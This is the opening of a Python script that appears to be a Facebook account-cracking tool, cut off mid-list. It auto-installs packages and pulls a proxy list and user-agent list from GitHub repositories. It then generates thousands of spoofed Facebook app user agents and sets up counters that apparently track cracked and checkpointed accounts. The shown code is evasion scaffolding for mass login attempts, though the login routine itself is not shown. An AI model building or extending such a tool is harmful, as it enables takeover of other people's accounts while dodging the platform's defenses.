#───────────────[ IMPORT SYSTEM ]────────────────#
import os
import subprocess
import sys
required_packages = [
    'requests',
    'httpx',
    'beautifulsoup4',
    'rich',
    'urllib3'
]
def install_packages():
    for package in required_packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
try:
    import base64
    import datetime
    import json
    import math
    import platform
    import random
    import re
    import bs4
    import string
    import time
    import uuid
    import zlib
    import urllib3
    import requests
    import httpx
    from os import path
    from urllib.request import urlopen
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from concurrent.futures import ThreadPoolExecutor as tred
    from concurrent.futures import ThreadPoolExecutor as Tred
    from rich.table import Table as me
    from rich.console import Console as sol
    from rich.console import Group as gp
    from rich.panel import Panel as nel
    from rich.markdown import Markdown as mark
    from rich.columns import Columns as col
    from rich import pretty
    from rich.text import Text as tekz
    from time import localtime as lt
    from bs4 import BeautifulSoup as sop
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    install_packages()
    import base64
    import datetime
    import json
    import math
    import platform
    import random
    import re
    import string
    import time
    import uuid
    import zlib
    import urllib3
    import requests
    import httpx
    from os import path
    from urllib.request import urlopen
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from rich.table import Table as me
    from rich.console import Console as sol
    from rich.console import Group as gp
    from rich.panel import Panel as nel
    from rich.markdown import Markdown as mark
    from rich.columns import Columns as col
    from rich import pretty
    from rich.text import Text as tekz
    from time import localtime as lt
    from bs4 import BeautifulSoup as sop
  
rong=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong3=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong4=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong5=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong6=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong7=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
#__________________| IMPORT  END |__________________#

try:
    os.system('clear')
except:
    pass

pretty.install()

def clear():
    os.system('clear')
#__________________| ETC |__________________#

#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';M1 = '\033[1;31m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#__________________| UA DEF |__________________#
filename = '.uamax.txt'
if os.path.exists(filename):
    pass
else:
    try:
        sos = requests.get('https://raw.githubusercontent.com/Pro-Max-420/ua/main/bbnew.txt').text
        with open(filename, 'w') as f:
            f.write(sos)
    except Exception as e:
        print("NO INTERNET CONNECTION.....!!😣")
uadef = open(filename, 'r').read().splitlines()
#───────────────[ PROX ]─────────────────────────#
os.system('rm -rf .prox.txt')
try:
    prox = requests.get('https://raw.githubusercontent.com/SHAJON-404/Live-Proxy/main/prox.txt').text
    with open('.prox.txt', 'w') as f:
        f.write(prox)
except Exception as e:
    print("NO INTERNET CONNECTION.....!!😣")
proxy = open('.prox.txt', 'r').read().splitlines()
#───────────────[ USER AGENT ]─────────────────────────#
ugen2=[]
ugen=[]
ugen2 = []
ugen = []
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a = "Mozilla/5.0 (iPhone; CPU iPhone OS "
    b = "15_2_"+str(random.randint(0, 9))
    c = " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBIOS;FBAV/"
    d = str(random.randint(355, 370))
    e = ".0.0."
    f = str(random.randint(28,34))
    g = ".119;FBBV/"
    h = str(random.randint(270968982, 273914825))
    i = f";FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/{b};FBSS/2;FBID/phone;FBLC/"
    j = str(random.choice(["es_ES;FBOP/5;FBRV/","it_IT;FBOP/5;FBRV/"]))
    k = str(random.randint(274911763, 277913874))
    l = "]"
    ua = a+b+c+d+e+f+g+h+i+j+k+l
    ugen.append(ua)
for xd in range(10000):
    a = "FBAN/FB4A;FBAV/"
    b = str(random.randint(400, 426))
    c = ".0.0."
    d = str(random.randint(19, 24))
    e = ".105;FBBV/"
    f = str(random.randint(316828437, 321890423))
    ua = [
        'FBLC/en_US',
        'FBLC/en_GB',
        'FBLC/es_ES',
        'FBLC/fr_FR',
        'FBLC/de_DE',
        'FBLC/it_IT',
        'FBLC/pt_PT',
        'FBLC/ru_RU',
        'FBLC/ar_AR',
        'FBLC/zh_CN',
        'FBLC/zh_TW',
        'FBLC/ja_JP',
        'FBLC/ko_KR',
        'FBLC/vi_VN',
        'FBLC/id_ID',
        'FBLC/th_TH',
        'FBLC/ms_MY',
        'FBLC/tr_TR',
        'FBLC/pl_PL',
        'FBLC/nl_NL',
        'FBLC/sv_SE',
        'FBLC/da_DK',
        'FBLC/no_NO',
        'FBLC/fi_FI',
        'FBLC/cs_CZ',
        'FBLC/sk_SK',
        'FBLC/hu_HU',
        'FBLC/ro_RO',
        'FBLC/bg_BG',
        'FBLC/sr_RS',
        'FBLC/hr_HR',
        'FBLC/lt_LT',
        'FBLC/lv_LV',
        'FBLC/et_EE',
        'FBLC/sl_SI',
        'FBLC/mk_MK',
        'FBLC/sq_AL',
        'FBLC/iw_IL',
        'FBLC/hi_IN',
        'FBLC/bn_BD',
        'FBLC/ne_NP',
        'FBLC/ta_IN',
        'FBLC/ml_IN',
        'FBLC/gu_IN',
        'FBLC/pa_IN',
        'FBLC/or_IN',
        'FBLC/as_IN',
        'FBLC/mr_IN',
        'FBLC/sa_IN'
    ]
    g = f";FBDM/density=2.2,width=1080,height=2280;{random.choice(ua)};FBRV/"
    h = str(random.randint(193651229, 198551215))
    i = ";FBCR/Nokia;FBMF/Nokia;FBBD/Nokia 7.2;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/"
    j = str(random.randint(10, 12))
    k = ";FBOP/1;FBCA/arm64-v8a:"
    ua = a + b + c + d + e + f + g + h + i + j + k
    ugen2.append(ua)
    
user_agents = [
    "FBAN/FB4A;FBAV/299.0.0.3.129;FBBV/357347878;FBDM/{density=2.3,width=1080,height=1450};FBLC/en_PK;FBRV/818018892;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/373.0.0.9.109;FBBV/265912334;FBDM/{density=2.5,width=1080,height=1487};FBLC/en_IN;FBRV/803072318;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/308.0.0.6.107;FBBV/620908883;FBDM/{density=3.2,width=1080,height=1460};FBLC/en_GB;FBRV/266547772;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/385.0.0.2.134;FBBV/956700298;FBDM/{density=2.2,width=1080,height=1400};FBLC/id_ID;FBRV/443070692;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/199.0.0.4.180;FBBV/211914393;FBDM/{density=3.4,width=1080,height=1427};FBLC/he_IL;FBRV/536565958;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/334.0.0.3.162;FBBV/144139270;FBDM/{density=2.2,width=1080,height=1452};FBLC/ru_RU;FBRV/880588327;FBCR/Telenor;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/240.0.0.2.177;FBBV/541574211;FBDM/{density=2.5,width=1080,height=1462};FBLC/lt_LT;FBRV/811778111;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/223.0.0.4.140;FBBV/307624648;FBDM/{density=2.4,width=1080,height=1478};FBLC/pt_PT;FBRV/438278744;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/306.0.0.7.125;FBBV/748756468;FBDM/{density=3.5,width=1080,height=1471};FBLC/hi_IN;FBRV/311036015;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/395.0.0.2.172;FBBV/295663884;FBDM/{density=3.2,width=1080,height=1482};FBLC/cs_CZ;FBRV/627255972;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/226.0.0.3.119;FBBV/531614041;FBDM/{density=3.5,width=1080,height=1485};FBLC/ it_IT;FBRV/520764861;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/370.0.0.9.152;FBBV/185250136;FBDM/{density=3.2,width=1080,height=1432};FBLC/pt_PT;FBRV/858127514;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/396.0.0.5.146;FBBV/295499772;FBDM/{density=2.5,width=1080,height=1424};FBLC/pt_PT;FBRV/634012864;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7BG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/275.0.0.9.164;FBBV/976583862;FBDM/{density=2.3,width=1080,height=1493};FBLC/en_PK;FBRV/796684500;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/225.0.0.2.105;FBBV/247817190;FBDM/{density=3.5,width=1080,height=1447};FBLC/lt_LT;FBRV/160534098;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/358.0.0.7.181;FBBV/414767030;FBDM/{density=2.4,width=1080,height=1479};FBLC/en_IN;FBRV/314435272;FBCR/AT&T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/394.0.0.2.125;FBBV/368173092;FBDM/{density=2.4,width=1080,height=1439};FBLC/en_IN;FBRV/270096522;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/365.0.0.2.119;FBBV/764971298;FBDM/{density=3.5,width=1080,height=1482};FBLC/lt_LT;FBRV/726378281;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/217.0.0.8.197;FBBV/534711214;FBDM/{density=2.5,width=1080,height=1400};FBLC/hi_IN;FBRV/158506936;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/272.0.0.3.144;FBBV/771751771;FBDM/{density=3.2,width=1080,height=1483};FBLC/hi_IN;FBRV/988381215;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2011K2C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/284.0.0.7.99;FBBV/878600274;FBDM/{density=3.2,width=1080,height=1478};FBLC/he_IL;FBRV/281463046;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/383.0.0.7.107;FBBV/382684604;FBDM/{density=2.5,width=1080,height=1482};FBLC/cs_CZ;FBRV/251588674;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/213.0.0.1.113;FBBV/392032341;FBDM/{density=2.2,width=1080,height=1491};FBLC/pl_PL;FBRV/380478346;FBCR/Ufone;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/226.0.0.2.199;FBBV/457912479;FBDM/{density=3.5,width=1080,height=1452};FBLC/pt_PT;FBRV/592020928;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/276.0.0.4.179;FBBV/909546775;FBDM/{density=3.4,width=1080,height=1486};FBLC/en_US;FBRV/252456437;FBCR/MtelBG;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/275.0.0.5.119;FBBV/597243518;FBDM/{density=3.2,width=1080,height=1499};FBLC/cs_CZ;FBRV/689290214;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/329.0.0.3.179;FBBV/258639995;FBDM/{density=3.2,width=1080,height=1445};FBLC/pl_PL;FBRV/809874333;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/383.0.0.4.188;FBBV/511353711;FBDM/{density=3.4,width=1080,height=1454};FBLC/hi_IN;FBRV/585991379;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/218.0.0.5.128;FBBV/770446766;FBDM/{density=3.3,width=1080,height=1484};FBLC/pl_PL;FBRV/893692784;FBCR/Sprint;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/320.0.0.3.168;FBBV/532922268;FBDM/{density=3.5,width=1080,height=1438};FBLC/en_IN;FBRV/595359852;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/355.0.0.5.187;FBBV/446269940;FBDM/{density=2.2,width=1080,height=1431};FBLC/he_IL;FBRV/210241262;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/369.0.0.5.140;FBBV/893327877;FBDM/{density=2.4,width=1080,height=1469};FBLC/ru_RU;FBRV/244901542;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/336.0.0.5.104;FBBV/250735543;FBDM/{density=2.2,width=1080,height=1458};FBLC/en_PK;FBRV/171911536;FBCR/EE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/303.0.0.7.139;FBBV/412975790;FBDM/{density=3.3,width=1080,height=1452};FBLC/pl_PL;FBRV/384027758;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/279.0.0.1.186;FBBV/657738346;FBDM/{density=2.5,width=1080,height=1402};FBLC/ru_RU;FBRV/511137842;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/335.0.0.6.144;FBBV/681735580;FBDM/{density=2.5,width=1080,height=1448};FBLC/en_US;FBRV/392818967;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/257.0.0.2.153;FBBV/233997248;FBDM/{density=2.4,width=1080,height=1437};FBLC/ it_IT;FBRV/641198188;FBCR/Telenor;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/326.0.0.3.108;FBBV/552682731;FBDM/{density=2.3,width=1080,height=1427};FBLC/en_PK;FBRV/219307270;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/201.0.0.5.140;FBBV/981666434;FBDM/{density=3.4,width=1080,height=1413};FBLC/id_ID;FBRV/647016848;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/277.0.0.5.194;FBBV/433854615;FBDM/{density=3.4,width=1080,height=1438};FBLC/en_PK;FBRV/193846835;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/240.0.0.7.102;FBBV/782143219;FBDM/{density=3.5,width=1080,height=1477};FBLC/pl_PL;FBRV/119055042;FBCR/Jazz;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/245.0.0.8.172;FBBV/568382085;FBDM/{density=3.3,width=1080,height=1487};FBLC/hi_IN;FBRV/437691693;FBCR/Azercell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/315.0.0.8.130;FBBV/766666282;FBDM/{density=3.5,width=1080,height=1490};FBLC/pt_PT;FBRV/710026726;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/297.0.0.7.122;FBBV/911558815;FBDM/{density=3.2,width=1080,height=1483};FBLC/nl_NL;FBRV/126095501;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/243.0.0.3.171;FBBV/236953208;FBDM/{density=2.5,width=1080,height=1422};FBLC/cs_CZ;FBRV/813940200;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/264.0.0.5.180;FBBV/703966218;FBDM/{density=3.5,width=1080,height=1465};FBLC/en_US;FBRV/535850360;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/252.0.0.1.115;FBBV/389447344;FBDM/{density=3.4,width=1080,height=1415};FBLC/id_ID;FBRV/339605198;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/332.0.0.9.112;FBBV/648215416;FBDM/{density=2.3,width=1080,height=1428};FBLC/pt_PT;FBRV/710941263;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/230.0.0.8.125;FBBV/492515266;FBDM/{density=3.5,width=1080,height=1492};FBLC/en_PK;FBRV/245580383;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/241.0.0.2.115;FBBV/801902013;FBDM/{density=2.2,width=1080,height=1402};FBLC/en_US;FBRV/882778564;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/244.0.0.5.197;FBBV/522969084;FBDM/{density=3.5,width=1080,height=1429};FBLC/hi_IN;FBRV/243554403;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/385.0.0.1.183;FBBV/211103465;FBDM/{density=3.5,width=1080,height=1409};FBLC/lt_LT;FBRV/683946517;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/239.0.0.6.175;FBBV/290479068;FBDM/{density=3.2,width=1080,height=1461};FBLC/cs_CZ;FBRV/980822477;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/218.0.0.2.197;FBBV/448935857;FBDM/{density=2.2,width=1080,height=1420};FBLC/ it_IT;FBRV/937813546;FBCR/EE;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/365.0.0.8.188;FBBV/393909466;FBDM/{density=3.4,width=1080,height=1462};FBLC/hi_IN;FBRV/570588972;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/341.0.0.9.167;FBBV/233733593;FBDM/{density=2.5,width=1080,height=1452};FBLC/hi_IN;FBRV/600028878;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/383.0.0.7.198;FBBV/823403889;FBDM/{density=2.2,width=1080,height=1423};FBLC/hi_IN;FBRV/397221522;FBCR/EE;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/341.0.0.8.134;FBBV/389331008;FBDM/{density=3.2,width=1080,height=1470};FBLC/pl_PL;FBRV/281734388;FBCR/Azercell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/252.0.0.6.189;FBBV/514582261;FBDM/{density=2.2,width=1080,height=1486};FBLC/lt_LT;FBRV/784993649;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/368.0.0.5.124;FBBV/138801054;FBDM/{density=3.4,width=1080,height=1467};FBLC/id_ID;FBRV/435979161;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/238.0.0.2.146;FBBV/617295195;FBDM/{density=3.2,width=1080,height=1444};FBLC/en_US;FBRV/544447179;FBCR/EE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/265.0.0.8.189;FBBV/538975998;FBDM/{density=2.4,width=1080,height=1496};FBLC/lt_LT;FBRV/353455468;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/222.0.0.7.111;FBBV/479122100;FBDM/{density=2.4,width=1080,height=1416};FBLC/nl_NL;FBRV/653165695;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/387.0.0.2.107;FBBV/506317793;FBDM/{density=3.3,width=1080,height=1498};FBLC/id_ID;FBRV/408524486;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/216.0.0.8.145;FBBV/681139498;FBDM/{density=2.3,width=1080,height=1496};FBLC/id_ID;FBRV/207506940;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/282.0.0.3.187;FBBV/845367242;FBDM/{density=2.4,width=1080,height=1488};FBLC/pt_PT;FBRV/993104058;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/206.0.0.7.158;FBBV/549392695;FBDM/{density=3.5,width=1080,height=1411};FBLC/ it_IT;FBRV/510725267;FBCR/Tele2You;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
